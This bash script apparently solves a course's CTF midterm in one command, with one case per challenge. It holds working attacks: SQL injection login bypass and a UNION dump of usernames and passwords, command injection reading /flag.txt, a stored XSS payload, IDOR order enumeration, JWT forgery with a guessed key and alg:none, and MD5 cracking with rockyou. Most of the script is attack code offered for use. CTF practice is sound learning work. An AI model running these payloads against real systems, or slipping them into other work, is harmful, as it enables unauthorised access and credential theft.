#!/usr/bin/env bash
# Week 9 midterm - one-command solver for the instructor's CTF platform.
#
# Usage:
#   ./w9-solve.sh 1 http://HOST:PORT     # ch1 SQLi Boss Fight  -> dumps FLAG
#   ./w9-solve.sh 2 http://HOST:PORT     # ch2 Shell Out        -> FLAG from /flag.txt
#   ./w9-solve.sh 4 http://HOST:PORT     # ch4 Not Your Order   -> FLAG from another user's order
#   ./w9-solve.sh 5 http://HOST:PORT     # ch5 Forge Ahead      -> FLAG from /api/admin
#   ./w9-solve.sh 3 http://HOST:PORT     # ch3 Pop the Alert    -> instructions (no flag)
#   ./w9-solve.sh 7                      # ch7 Penguin          -> ECB oracle (no flag, local container)
#   ./w9-solve.sh 6 [HASHFILE] [WORDLIST]# ch6 Crack It         -> cracks MD5 with a wordlist
#   ./w9-solve.sh 0 http://HOST:PORT     # probe: show what the instance serves
#
# Override the instance credentials if the platform assigns different ones:
#   W9_USER=alice W9_PW=alicepw ./w9-solve.sh 4 http://HOST:PORT
#   W9_ORDER_ID=2 ./w9-solve.sh 4 http://HOST:PORT

set -uo pipefail

N="${1:-}"
BASE="${2:-}"
W9_USER="${W9_USER:-alice}"
W9_PW="${W9_PW:-alicepw}"

hr() { printf '%s\n' "----------------------------------------------------------------"; }
say() { printf '\n=== %s ===\n' "$*"; }

# extract anything flag-shaped from a response
grab() {
  printf '%s' "$1" | grep -oE 'FLAG\{[^}]{1,80}\}' | sort -u
  if ! printf '%s' "$1" | grep -qE 'FLAG\{'; then
    printf '  (no FLAG{...} in the response)\n'
  fi
}

need_base() {
  if [ -z "$BASE" ]; then
    echo "ERROR: give me the instance URL, e.g.  ./w9-solve.sh $N http://HOST:PORT" >&2
    exit 2
  fi
  BASE="${BASE%/}"
}

case "$N" in

0)
  need_base
  say "CH0 probe: what is serving at $BASE"
  curl -s -m 15 -D - "$BASE/" | head -40
  ;;

1)
  need_base
  say "CH1 - login bypass as admin (proof of access)"
  R1=$(curl -s -m 20 -G "$BASE/login" --data-urlencode "user=admin'--" --data-urlencode "pw=x")
  printf '%s\n' "$R1"
  say "CH1 - dump the admin credentials (this is what returns the FLAG)"
  R2=$(curl -s -m 20 -G "$BASE/search" --data-urlencode "q=' UNION SELECT username,password FROM users--")
  printf '%s\n' "$R2"
  say "FLAG(S) FOUND"
  grab "$R2"
  ;;

2)
  need_base
  say "CH2 - OS command injection: read /flag.txt"
  R=$(curl -s -m 25 -G "$BASE/ping" --data-urlencode "host=127.0.0.1;cat /flag.txt")
  printf '%s\n' "$R"
  say "FLAG(S) FOUND"
  grab "$R"
  ;;

3)
  need_base
  say "CH3 - stored XSS (NO FLAG - the alert is the deliverable)"
  cat <<EOF
Post the payload to \$BASE/comments, then load /comments in a SECOND browser profile.
The alert must read document.domain (on a host:port instance that is the hostname).

  curl -s -X POST "$BASE/comments" --data-urlencode "body=<script>alert(document.domain)</script>"

Then:
  1. Terminal visible, run:
       printf '%s | %s | ' "\$(whoami)" '6631503050'; date '+%F %T %Z'
  2. Browser 2 -> $BASE/comments  -> the alert fires
  3. Whole-screen capture -> 3-6631503050.png
  4. DevTools check (F12 -> Console):  document.querySelectorAll('div.comment script').length   // expect 1

Tip: post only the <script> tag - not the surrounding <div class=comment> markup.
EOF
  ;;

4)
  need_base
  say "CH4 - log in as $W9_USER and read orders that are not theirs (IDOR)"
  RESP=$(curl -s -m 20 -X POST "$BASE/login" -H 'Content-Type: application/json' \
           -d "{\"user\":\"$W9_USER\",\"pw\":\"$W9_PW\"}")
  printf 'login response: %s\n' "$RESP"
  TOKEN=$(printf '%s' "$RESP" | python -c "import sys,json
try:
    print(json.load(sys.stdin).get('token',''))
except Exception:
    print('')" 2>/dev/null)
  if [ -z "$TOKEN" ]; then
    echo "  could not extract a token - check W9_USER / W9_PW against the platform's assigned account"
    exit 1
  fi
  printf 'token: %s...\n' "$(printf '%s' "$TOKEN" | cut -c1-30)"
  FOUND=""
  for ID in ${W9_ORDER_ID:-1 2 3 4 5 6}; do
    say "GET /api/orders/$ID"
    O=$(curl -s -m 15 "$BASE/api/orders/$ID" -H "Authorization: Bearer $TOKEN")
    printf '%s\n' "$O"
    FOUND="$FOUND$O"
  done
  say "FLAG(S) FOUND"
  grab "$FOUND"
  ;;

5)
  need_base
  say "CH5 - forge a JWT with sub=admin (two independent methods)"
  FORGED_HS=$(python -c "
import base64,hmac,hashlib,json
b64=lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h=b64(json.dumps({'alg':'HS256','typ':'JWT'},separators=(',',':')).encode())
p=b64(json.dumps({'sub':'admin'},separators=(',',':')).encode())
print(f\"{h}.{p}.\" + b64(hmac.new(b'secret', f'{h}.{p}'.encode(), hashlib.sha256).digest()))
")
  FORGED_NONE=$(python -c "
import base64,json
b64=lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h=b64(json.dumps({'alg':'none','typ':'JWT'},separators=(',',':')).encode())
p=b64(json.dumps({'sub':'admin'},separators=(',',':')).encode())
print(f'{h}.{p}.')
")
  FOUND=""
  for NAME in HS256 alg-none; do
    if [ "$NAME" = "HS256" ]; then T="$FORGED_HS"; else T="$FORGED_NONE"; fi
    say "GET /api/admin with $NAME token"
    A=$(curl -s -m 15 "$BASE/api/admin" -H "Authorization: Bearer $T")
    printf '%s\n' "$A"
    FOUND="$FOUND$A"
  done
  say "FLAG(S) FOUND"
  grab "$FOUND"
  ;;

6)
  HF="${2:-}"
  WL="${3:-}"
  if [ -z "$HF" ]; then
    CD=""
    for C in "$HOME/software-security/labs/week03-cryptography" \
             "$HOME/Desktop/School Work/Assignment1Gravity/software-security/labs/week03-cryptography"; do
      if [ -d "$C" ]; then CD="$C"; break; fi
    done
    [ -z "$CD" ] && CD="."
    HF="$CD/cleaned_hashes.txt"
    WL="$CD/rockyou.txt"
  fi
  [ -z "$WL" ] && WL="$(dirname "$HF")/rockyou.txt"
  say "CH6 - crack unsalted MD5"
  echo "  hashfile : $HF"
  echo "  wordlist : $WL"
  if [ ! -f "$HF" ]; then
    echo "  ERROR: hash file not found: $HF"
    echo "  Usage: bash w9-solve.sh 6 /path/to/supplied_hashes.txt [/path/to/wordlist.txt]"
    exit 2
  fi
  # native Windows python cannot resolve MSYS-style /c/... paths - convert them
  HFW=$(cygpath -w "$HF" 2>/dev/null || printf '%s' "$HF")
  WLW=$(cygpath -w "$WL" 2>/dev/null || printf '%s' "$WL")
  python - "$HFW" "$WLW" <<'PY'
import hashlib, sys
hf, wl = sys.argv[1], sys.argv[2]
try:
    words = open(wl, encoding='latin-1').read().split()
except Exception as e:
    print(f"  wordlist unreadable ({e}) - falling back to a built-in common-password list")
    words = ["password","123456","123456789","12345678","qwerty","abc123","letmein",
             "password123","admin","welcome","monkey","dragon","iloveyou","secret"]
table = {hashlib.md5(w.encode()).hexdigest(): w for w in words}
print(f"  wordlist entries: {len(words)}")
found = 0
for line in open(hf, encoding='latin-1'):
    h = line.strip()
    if not h or h.startswith('#'):
        continue
    val = table.get(h)
    if val:
        print(f"  {h}  ->  {val}")
        found += 1
    else:
        print(f"  {h}  ->  NOT IN WORDLIST")
print(f"  recovered {found} of the hashes")
PY
  ;;

7)
  say "CH7 - ECB oracle (NO FLAG - two identical blocks is the evidence)"
  CD="$HOME/software-security/labs/week03-cryptography"
  if [ ! -d "$CD" ]; then CD="$HOME/Desktop/School Work/Assignment1Gravity/software-security/labs/week03-cryptography"; fi
  echo "  running in: $CD"
  ( cd "$CD" && docker compose run --rm crypto-lab bash -c \
    "pip install -q --no-cache-dir pycryptodome && python -c \"from vulnerable_crypto import encrypt_ecb; ct=encrypt_ecb(bytes([65])*32); print('block 1:', ct[:16].hex()); print('block 2:', ct[16:32].hex()); print('identical:', ct[:16]==ct[16:32])\"" ) 2>&1 | grep -vE 'WARNING|notice|^$'
  cat <<'EOF'

Then capture the whole screen with the identity stamp visible -> 7-6631503050.png
EOF
  ;;

*)
  sed -n '2,20p' "$0"
  ;;
esac
